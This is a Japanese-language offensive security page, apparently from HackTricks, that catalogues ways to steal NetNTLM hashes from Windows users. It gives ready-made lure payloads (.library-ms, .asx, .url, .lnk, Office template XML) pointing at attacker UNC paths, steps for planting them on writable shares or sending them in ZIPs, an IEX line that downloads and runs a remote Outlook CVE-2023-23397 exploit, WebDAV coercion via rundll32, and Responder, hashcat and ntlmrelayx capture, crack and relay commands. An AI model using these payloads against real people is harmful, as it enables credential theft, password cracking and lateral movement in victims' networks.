# NTLM creds を盗取できる場所

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) にある、オンラインから microsoft word ファイルをダウンロードする方法から ntlm leaks の source である https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md、さらに [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) まで、優れたアイデアをすべて確認してください。**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**ユーザーや scheduled jobs が Explorer で参照する share に書き込める**場合、metadata が自身の UNC（例: `\\ATTACKER\share`）を指すファイルを配置します。フォルダーが表示されると **implicit SMB authentication** がトリガーされ、listener に **NetNTLMv2** が漏洩します。<sup>[[1]](#references)</sup>

1. **lures を生成する**（SCF/URL/LNK/library-ms/desktop.ini/Office/RTF などに対応）
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **writable share に配置する**（被害者が開く任意のフォルダ）：
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listenしてcrack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows は複数のファイルに同時にアクセスする場合があります。Explorer がプレビューするもの（`BROWSE TO FOLDER`）では、クリックは必要ありません。

### Windows Media Player プレイリスト（.ASX/.WAX）

対象に、こちらで制御する Windows Media Player プレイリストを開かせるかプレビューさせることができれば、エントリの参照先を UNC パスに指定して Net-NTLMv2 を leak できます。WMP は参照されたメディアを SMB 経由で取得しようとし、その際に暗黙的に認証します。<sup>[[3]](#references)[[4]](#references)</sup>

ペイロードの例：
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
収集とcrackingのフロー:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer は、ZIP archive 内から直接開かれた .library-ms file を安全でない方法で処理します。library definition が remote UNC path（例: \\attacker\share）を指している場合、ZIP 内の .library-ms を単に browse/launch するだけで、Explorer は UNC を列挙し、attacker に NTLM authentication を送信します。これにより、offline で crack でき、場合によっては relay も可能な NetNTLMv2 が得られます。<sup>[[2]](#references)</sup>

Attacker UNC を指す最小限の .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
運用手順
- 上記の XML を使用して .library-ms ファイルを作成する（自分の IP/hostname を設定）。
- それを ZIP に圧縮し（Windows の場合: 送る → 圧縮（zip 形式）フォルダー）、target に送付する。
- NTLM capture listener を実行し、victim が ZIP 内から .library-ms を開くのを待つ。


### Outlook calendar reminder sound path (CVE-2023-23397) – ゼロクリック Net-NTLMv2 leak

Microsoft Outlook for Windows は、calendar item 内の拡張 MAPI property PidLidReminderFileParameter を処理していた。その property が UNC path（例: \\attacker\share\alert.wav）を指している場合、reminder が発生した際に Outlook が SMB share に接続し、クリックなしで user の Net-NTLMv2 が leak していた。この問題は 2023 年 3 月 14 日に patch されたが、legacy/未対応の fleet や過去の incident response では依然として非常に関連性が高い。<sup>[[5]](#references)</sup>

PowerShell（Outlook COM）を使用した簡単な exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener側：
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- 被害者は、reminder が発生したときに Outlook for Windows を実行しているだけでよい。
- leak により、offline cracking または relay に利用可能な Net‑NTLMv2 が取得される（pass-the-hash ではない）。


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 の bypass)

Windows Explorer は shortcut の icon を自動的に render する。最近の research により、UNC‑icon shortcut に対する Microsoft の 2025 年 4 月の patch 後も、shortcut target を UNC path 上でホストし、icon を local に保持することで、click なしに NTLM authentication を trigger できることが判明した（この patch bypass には CVE‑2025‑50154 が割り当てられた）。folder を表示するだけで、Explorer は remote target から metadata を取得し、attacker の SMB server に NTLM を送信する。<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell を使用した Program Shortcut payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- ショートカットを ZIP に入れ、被害者に参照させる。
- 被害者が開く writable share にショートカットを配置する。
- 同じフォルダ内に他の lure files も配置し、Explorer が各アイテムをプレビューするようにする。

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows は、実行時だけでなく、**view/preview**（icon rendering）時にも `.lnk` metadata を読み込む。CVE‑2026‑25185 は、**ExtraData** blocks によって shell が icon path を resolve し、**load 中に** filesystem にアクセスする parsing path を示している。path が remote の場合、outbound NTLM が送信される。

Key trigger conditions（`CShellLink::_LoadFromStream` で確認）:
- ExtraData に **DARWIN_PROPS** (`0xa0000006`) を含める（icon update routine への gate）。
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) に `TargetUnicode` を設定する。
- loader は `TargetUnicode` 内の environment variables を expand し、結果の path に対して `PathFileExistsW` を呼び出す。

`TargetUnicode` が UNC path（例: `\\attacker\share\icon.ico`）に resolve される場合、ショートカットを含む folder を**表示するだけ**で outbound authentication が発生する。同じ load path は **indexing** や **AV scanning** によっても実行されるため、実用的な no-click leak surface となる。<sup>[[7]](#references)</sup>

Research tooling（parser/generator/UI）は、Windows GUI を使用せずにこれらの structures を build/inspect できる **LnkMeMaybe** project で利用できる。<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

native **WebDAV client** を悪用すると、現在の logon session に任意の **HTTP/WebDAV** endpoint への authentication を強制できる。
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
役立つ理由:
- **攻撃者が管理する WebDAV サーバー**に対して、カスタムクライアントを配置せずに **NTLM over HTTP** をトリガーできます。
- **内部ホスト**に対しては、横展開する前に、盗んだ認証情報がどこで受け入れられるかを静かに検証する方法です。<sup>[[9]](#references)</sup>
- **SMB egress がフィルタリングされている**一方で、**HTTP/WebDAV**には到達できる場合の有効な代替手段です。

運用上の注意:
- ソースホストで **WebClient** サービスが実行されている必要があります。
- `rundll32.exe` は `davclnt.dll` をロードし、Windows に **現在のユーザーの認証情報**を使用して WebDAV 認証を処理させます。<sup>[[10]](#references)</sup>
- 自分が管理するインフラを指定する場合は、次のような NTLM 対応の HTTP listener/relay を使用します:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
検知の観点では、多数の内部システムに対する `rundll32.exe davclnt.dll,DavSetCookie` の繰り返し実行は、通常のユーザー行動ではなく、**credential validation / spray-like lateral movement prep** を示す強いシグナルです。<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office ドキュメントは外部テンプレートを参照できます。添付テンプレートを UNC パスに設定すると、ドキュメントを開いた際に SMB へ認証します。

最小限の DOCX relationship changes（word/ 内）:

1) word/settings.xml を編集し、添付テンプレートの参照を追加します:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels を編集し、rId1337 を自身の UNC に向けます。
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) `.docx` に再パッケージ化して配布します。SMB capture listener を実行し、開かれるまで待機します。

capture 後の NTLM の relay または悪用に関するアイデアについては、以下を確認してください。

{{#ref}}
README.md
{{#endref}}


## 参考資料
- [1] [HTB: Breach – Writable share の lure + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction による webroot RCE → FullPowers + GodPotato で SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – Microsoft における 5 件の NTLM vulnerabilities: 未修正の privilege escalation threats](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft が Outlook EoP (CVE‑2023‑23397) を緩和し、PidLidReminderFileParameter 経由の NTLM leak を説明](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click、one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: CVE‑2026‑25185 のレビュー](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – IT Support からの連絡時: Teams から Domain Compromise までの ModeloRAT Campaign の分析](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
